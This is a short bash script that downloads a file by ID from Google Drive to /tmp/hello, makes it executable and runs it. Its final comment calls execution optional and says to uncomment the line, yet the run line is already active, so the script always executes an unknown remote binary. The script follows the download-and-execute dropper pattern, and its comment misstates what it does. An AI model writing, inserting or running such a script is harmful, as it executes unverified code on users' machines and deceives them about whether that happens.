#!/bin/bash

# Google Drive file ID
FILE_ID="1fwZz1s_YTkrAdAJnMLHKdmppmFwE_T8P"
# Destination path for the downloaded file
DESTINATION="/tmp/hello"

# Step 1: Fetch the confirmation token (if needed) and download the file
curl -c /tmp/cookie -s -L "https://drive.google.com/uc?export=download&id=${FILE_ID}" > /tmp/intermediate.html

# Step 2: If there's a confirmation token, parse and use it
CONFIRM=$(awk '/download/ {print $NF}' /tmp/intermediate.html | grep -o 'confirm=[^&]*' | cut -d '=' -f2)

# Step 3: Download the file with the confirmation token (if any)
if [[ -n "$CONFIRM" ]]; then
  curl -L -b /tmp/cookie "https://drive.google.com/uc?export=download&confirm=${CONFIRM}&id=${FILE_ID}" -o "$DESTINATION"
else
  curl -L -o "$DESTINATION" "https://drive.google.com/uc?export=download&id=${FILE_ID}"
fi

# Cleanup
rm /tmp/cookie /tmp/intermediate.html

# Make the file executable
chmod +x "$DESTINATION"

# Optionally run the executable (uncomment the line below if you want to run it immediately)
"$DESTINATION"
